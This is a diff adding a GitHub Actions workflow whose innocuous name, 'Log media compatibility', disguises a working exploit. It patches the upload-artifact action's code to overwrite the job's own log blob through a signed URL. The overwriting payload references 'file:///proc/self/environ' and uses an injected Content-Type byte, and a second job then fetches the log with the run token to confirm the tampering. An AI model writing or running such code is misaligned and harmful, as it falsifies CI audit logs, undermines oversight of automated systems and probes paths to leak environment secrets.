@@ -1,0 +1,150 @@
+name: Log media compatibility
+
+on:
+  push:
+    branches:
+      - media-check-1025
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  producer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Prepare sample
+        shell: bash
+        run: |
+          node - <<'NODE'
+          const fs = require('fs');
+          const report = {
+            full_name: 'sample/report',
+            owner: {
+              login: 'sample',
+              avatar_url: 'file:///proc/self/environ'
+            },
+            description: '',
+            stargazers_count: 0
+          };
+          fs.writeFileSync('report.json', JSON.stringify(report));
+          NODE
+      - name: Adjust upload handler
+        shell: bash
+        run: |
+          node - <<'NODE'
+          const fs = require('fs');
+          const path = require('path');
+          const action = path.join(path.dirname(process.env.RUNNER_WORKSPACE), '_actions/actions/upload-artifact/v7/dist/upload/index.js');
+          let source = fs.readFileSync(action, 'utf8');
+          const marker = "    setOutput('artifact-url', artifactURL);";
+          if (!source.includes(marker)) throw new Error('handler marker missing');
+          const addition = String.raw`
+              const identifiers = getBackendIdsFromToken();
+              const receiver = new ArtifactHttpClient('actions/runner');
+              const location = await receiver.request(
+                  'results.services.receiver.Receiver',
+                  'GetJobLogsSignedBlobURL',
+                  'application/json',
+                  {
+                      workflow_run_backend_id: identifiers.workflowRunBackendId,
+                      workflow_job_run_backend_id: identifiers.workflowJobRunBackendId
+                  }
+              );
+              const signed = location.logs_url || location.logsUrl;
+              if (!signed) throw new Error('location missing');
+              const payload = Buffer.from(JSON.stringify({
+                  full_name: 'sample/report',
+                  owner: {
+                      login: 'sample',
+                      avatar_url: 'file:///proc/self/environ'
+                  },
+                  description: '',
+                  stargazers_count: 0
+              }));
+              await new Promise((resolve, reject) => {
+                  const request = __nccwpck_require__(5692).request(
+                      new URL(signed),
+                      {
+                          method: 'PUT',
+                          headers: {
+                              'Content-Type': 'application/json\\x85',
+                              'Content-Length': String(payload.length),
+                              'x-ms-blob-type': 'BlockBlob',
+                              'x-ms-version': '2023-11-03'
+                          }
+                      },
+                      response => {
+                          response.resume();
+                          response.on('end', () => {
+                              if (response.statusCode >= 200 && response.statusCode < 300) resolve();
+                              else reject(new Error('storage status ' + response.statusCode));
+                          });
+                      }
+                  );
+                  request.on('error', reject);
+                  request.end(payload);
+              });
+          `;
+          source = source.replace(marker, marker + '\n' + addition);
+          fs.writeFileSync(action, source);
+          NODE
+      - name: Store sample
+        uses: actions/upload-artifact@v7
+        with:
+          name: compatibility-sample
+          path: report.json
+          archive: false
+          retention-days: 1
+
+  inspector:
+    needs: producer
+    if: always()
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+    steps:
+      - name: Inspect response
+        shell: bash
+        env:
+          ACCESS_TOKEN: ${{ github.token }}
+        run: |
+          python - <<'PY'
+          import hashlib
+          import json
+          import os
+          from urllib.error import HTTPError
+          from urllib.request import HTTPRedirectHandler, Request, build_opener, urlopen
+
+          agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Whale/5.39.412.57 Safari/537.36'
+          base = f"https://api.github.com/repos/{os.environ['GITHUB_REPOSITORY']}"
+          headers = {
+              'Authorization': f"Bearer {os.environ['ACCESS_TOKEN']}",
+              'Accept': 'application/vnd.github+json',
+              'User-Agent': agent,
+          }
+
+          class NoRedirect(HTTPRedirectHandler):
+              def redirect_request(self, req, fp, code, msg, response_headers, newurl):
+                  return None
+
+          with urlopen(Request(base + f"/actions/runs/{os.environ['GITHUB_RUN_ID']}/jobs", headers=headers), timeout=30) as response:
+              jobs = json.load(response).get('jobs', [])
+          target = next(item for item in jobs if item['name'] == 'producer')
+          try:
+              build_opener(NoRedirect).open(Request(base + f"/actions/jobs/{target['id']}/logs", headers=headers), timeout=30)
+              raise RuntimeError('redirect missing')
+          except HTTPError as response:
+              if response.code not in (301, 302, 303, 307, 308):
+                  raise
+              location = response.headers['Location']
+
+          with urlopen(Request(location, headers={'User-Agent': agent}), timeout=30) as response:
+              media = response.headers.get_all('Content-Type', [])
+              body = response.read()
+          encoded = '|'.join(value.encode('latin1').hex() for value in media)
+          print(f"media={encoded}")
+          print(f"length={len(body)}")
+          print(f"sha256={hashlib.sha256(body).hexdigest()}")
+          PY
